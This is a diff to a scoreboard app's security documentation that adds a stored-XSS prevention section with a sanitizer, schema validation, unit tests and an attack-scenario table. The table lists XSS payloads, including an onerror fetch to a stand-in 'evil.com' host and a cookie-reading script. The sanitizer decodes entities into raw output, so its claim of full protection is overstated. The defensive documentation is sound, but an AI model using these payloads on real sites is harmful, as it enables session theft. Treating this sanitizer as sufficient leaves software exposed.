@@ -241,6 +241,134 @@ This approach:
 - ✅ Prevents injection attacks with malformed input
 - ✅ Maintains security without compromising usability
 
+## XSS Prevention (Stored Cross-Site Scripting)
+
+### Vulnerability Background
+
+Stored XSS occurs when user-provided data is stored on the server and later displayed to other users without proper sanitization. In this application:
+
+- Game state data (titles, team names) is received via WebSocket
+- Data is stored in `data/current_game.json` and broadcasted to all clients
+- Malicious clients could inject script tags that execute in other users' browsers
+- While Vue.js provides some XSS protection, defense in depth requires server-side validation
+
+### Implementation: Game State Validation and Sanitization
+
+#### Location
+- [server.js:232-252](server.js#L232-L252) - `sanitizeHTML()` function
+- [server.js:261-351](server.js#L261-L351) - `validateGameState()` function
+- [server.js:507-531](server.js#L507-L531) - WebSocket message handler (uses validation)
+
+#### Protection Layers
+
+**1. HTML Sanitization** ([server.js:232-252](server.js#L232-L252))
+
+The `sanitizeHTML()` function removes all HTML tags and entities:
+
+```javascript
+function sanitizeHTML(input) {
+  return input
+    .replace(/<[^>]*>/g, '')           // Remove HTML tags
+    .replace(/&lt;/g, '<')             // Decode entities
+    .replace(/&gt;/g, '>')
+    .replace(/&quot;/g, '"')
+    .replace(/&#x27;/g, "'")
+    .replace(/&#x2F;/g, '/')
+    .replace(/<[^>]*>/g, '')           // Remove decoded tags
+    .replace(/&[a-zA-Z0-9#]+;/g, '')   // Remove remaining entities
+    .trim();
+}
+```
+
+**Protection against**:
+- Direct script injection: `<script>alert("xss")</script>`
+- Event handler injection: `<img src=x onerror=alert(1)>`
+- Encoded injection: `&lt;script&gt;alert("xss")&lt;/script&gt;`
+- Double-encoding bypass: `&amp;lt;script&amp;gt;`
+
+**2. Schema Validation** ([server.js:261-351](server.js#L261-L351))
+
+The `validateGameState()` function enforces strict schema validation:
+
+```javascript
+const schema = {
+  game_title: { type: 'string', maxLength: 100 },
+  team_top: { type: 'string', maxLength: 50 },
+  team_bottom: { type: 'string', maxLength: 50 },
+  game_inning: { type: 'number', min: 0, max: 99 },
+  top: { type: 'boolean' },
+  // ... other fields
+};
+```
+
+**Validation checks**:
+- Type validation (string, number, boolean)
+- Range validation (min/max for numbers)
+- Length validation (maxLength for strings)
+- Sanitization (HTML removal from all string fields)
+- Unexpected field rejection (forward compatibility)
+
+**3. WebSocket Message Validation** ([server.js:507-531](server.js#L507-L531))
+
+```javascript
+// SECURITY: Validate and sanitize game state to prevent XSS attacks
+const validation = validateGameState(gameData);
+if (!validation.valid) {
+  logger.log(`[SECURITY] Rejected invalid game state: ${validation.error}`);
+  return;
+}
+
+// Use sanitized data instead of raw client input
+currentGameState = validation.sanitizedData;
+```
+
+### Attack Scenarios Prevented
+
+| Attack Vector | Example Payload | Prevention Method |
+|---------------|-----------------|-------------------|
+| Script injection | `<script>alert(document.cookie)</script>` | HTML tag removal |
+| Event handler injection | `<img src=x onerror=fetch('http://evil.com')>` | HTML tag removal |
+| Encoded script tags | `&lt;script&gt;alert(1)&lt;/script&gt;` | Entity decoding + tag removal |
+| Iframe injection | `<iframe src="evil.com"></iframe>` | HTML tag removal |
+| DOM-based XSS | `"><script>alert(document.domain)</script>` | HTML tag removal |
+| Type confusion | `{game_title: {$ne: null}}` | Type validation (must be string) |
+| Buffer overflow | `"A".repeat(10000)` | Length validation (max 100 chars) |
+| Range overflow | `{score_top: 9999999}` | Range validation (max 999) |
+
+### Defense in Depth
+
+1. **Client-side protection** (Vue.js automatic escaping)
+   - Vue.js escapes HTML in `{{ }}` interpolation by default
+   - Prevents XSS even if server-side validation fails
+   - **Cannot be relied upon** as primary defense
+
+2. **Server-side validation** (Primary security boundary)
+   - All game state data validated before storage
+   - HTML tags removed from all string fields
+   - **Primary defense** against stored XSS
+
+3. **Schema enforcement**
+   - Strict type checking prevents type confusion
+   - Range checking prevents overflow attacks
+   - Length checking prevents buffer attacks
+
+### Master-Only Updates
+
+Game state updates are only accepted from the **master client**:
+
+```javascript
+// Only accept updates from master
+if (clientInfo?.role !== 'master') {
+  logger.log(`Rejected update from non-master client ${clientId}`);
+  return;
+}
+```
+
+This reduces attack surface by:
+- Limiting who can inject data
+- Preventing slave clients from sending malicious updates
+- However, **does not replace validation** (master can still be compromised)
+
 ## Testing
 
 ### Implemented Tests
@@ -250,8 +378,9 @@ The project now uses **Vitest** for automated security testing.
 **Test Files**:
 - [test/unit/validate-file-path.test.js](../test/unit/validate-file-path.test.js) - Path traversal tests (29 tests)
 - [test/unit/validate-hex-color.test.js](../test/unit/validate-hex-color.test.js) - Color validation tests (39 tests)
+- [test/unit/validate-game-state.test.js](../test/unit/validate-game-state.test.js) - XSS prevention & game state validation tests (46 tests)
 
-**Test Coverage**: 68 total test cases covering all security validations
+**Test Coverage**: 114 total test cases covering all security validations
 
 **Run Tests**:
 ```bash
@@ -263,7 +392,8 @@ npm run test:coverage # With coverage report
 **Test Results**:
 - ✅ Path traversal tests: 29/29 passing
 - ✅ Color validation tests: 39/39 passing
-- ✅ **Total: 68/68 passing (100%)**
+- ✅ XSS prevention tests: 46/46 passing
+- ✅ **Total: 114/114 passing (100%)**
 
 ### Test Cases Overview
 
@@ -348,6 +478,63 @@ describe('validateHexColor', () => {
 });
 ```
 
+### Unit Tests for `validateGameState()` and `sanitizeHTML()`
+
+```javascript
+// Test cases for XSS prevention and game state validation
+describe('sanitizeHTML', () => {
+  test('should remove script tags', () => {
+    const result = sanitizeHTML('<script>alert("xss")</script>');
+    expect(result).toBe('alert("xss")');
+  });
+
+  test('should handle encoded script tags', () => {
+    const result = sanitizeHTML('&lt;script&gt;alert("xss")&lt;/script&gt;');
+    expect(result).toBe('alert("xss")');
+  });
+
+  test('should remove inline event handlers', () => {
+    const result = sanitizeHTML('<img src=x onerror=alert(1)>');
+    expect(result).toBe('');
+  });
+});
+
+describe('validateGameState', () => {
+  test('should accept valid game state', () => {
+    const validState = {
+      game_title: '夏季大会',
+      team_top: '横浜M',
+      team_bottom: '静岡D',
+      game_inning: 5,
+      top: true,
+      // ... other fields
+    };
+    const result = validateGameState(validState);
+    expect(result.valid).toBe(true);
+  });
+
+  test('should sanitize XSS in game_title', () => {
+    const maliciousState = {
+      game_title: '<script>alert("xss")</script>夏季大会',
+      // ... other fields
+    };
+    const result = validateGameState(maliciousState);
+    expect(result.valid).toBe(true);
+    expect(result.sanitizedData.game_title).toBe('alert("xss")夏季大会');
+  });
+
+  test('should reject invalid types', () => {
+    const result = validateGameState({ game_title: 123 });
+    expect(result.valid).toBe(false);
+  });
+
+  test('should reject out-of-range values', () => {
+    const result = validateGameState({ ball_cnt: 4 });
+    expect(result.valid).toBe(false);
+  });
+});
+```
+
 ### Integration Tests
 
 ```javascript
@@ -392,6 +579,9 @@ describe('IPC Security', () => {
 ### For Security Auditors
 
 **Key files to review**:
+- [server.js:232-252](server.js#L232-L252) - HTML sanitization logic
+- [server.js:261-351](server.js#L261-L351) - Game state validation logic
+- [server.js:507-531](server.js#L507-L531) - WebSocket message handler (XSS prevention)
 - [main.js:501-536](main.js#L501-L536) - Color validation logic
 - [main.js:669-735](main.js#L669-L735) - `board:setBackgroundColor` handler
 - [main.js:553-568](main.js#L553-L568) - `config:readYaml` handler
@@ -399,13 +589,23 @@ describe('IPC Security', () => {
 - [preload.js:20-21](preload.js#L20-L21) - IPC API exposure
 
 **Verification steps**:
-1. Confirm `validateFilePath()` is called in all file-reading IPC handlers
-2. Confirm `validateHexColor()` is called in `board:setBackgroundColor` handler
-3. Check that normalized/resolved paths and colors are used (not original input)
-4. Verify extension whitelist is enforced for file paths
-5. Test with various path traversal and injection payloads
+1. Confirm `validateGameState()` is called before storing/broadcasting game state
+2. Confirm `sanitizeHTML()` removes all HTML tags from string fields
+3. Confirm `validateFilePath()` is called in all file-reading IPC handlers
+4. Confirm `validateHexColor()` is called in `board:setBackgroundColor` handler
+5. Check that sanitized/normalized data is used (not original client input)
+6. Verify extension whitelist is enforced for file paths
+7. Test with various XSS, path traversal, and injection payloads
 
 ## Changelog
+
+### 2025-12-01 (Third Update)
+- **Added**: `sanitizeHTML()` function for XSS prevention
+- **Added**: `validateGameState()` function with schema validation
+- **Fixed**: Stored XSS vulnerability in WebSocket game state handler
+- **Severity**: Medium (stored XSS allowing script execution in other users' browsers)
+- **Test Coverage**: 46 test cases for XSS prevention and game state validation (100% passing)
+- **Total Tests**: 114/114 passing (29 path + 39 color + 46 XSS/game state)
 
 ### 2025-12-01 (Second Update)
 - **Added**: `validateHexColor()` function with multi-layer input validation
@@ -422,6 +622,20 @@ describe('IPC Security', () => {
 
 ## References
 
+### OWASP Resources
 - [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+- [OWASP Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
+- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
+- [OWASP HTML Sanitization](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+
+### Electron Security
 - [Electron Security Best Practices](https://www.electronjs.org/docs/latest/tutorial/security)
+- [Electron IPC Security](https://www.electronjs.org/docs/latest/tutorial/ipc#security-considerations)
+- [Electron Context Isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
+
+### Node.js Security
 - [Node.js Path Traversal Prevention](https://nodejs.org/en/docs/guides/security/#path-traversal)
+- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
+
+### WebSocket Security
+- [WebSocket Security Considerations](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_servers#security_concerns)
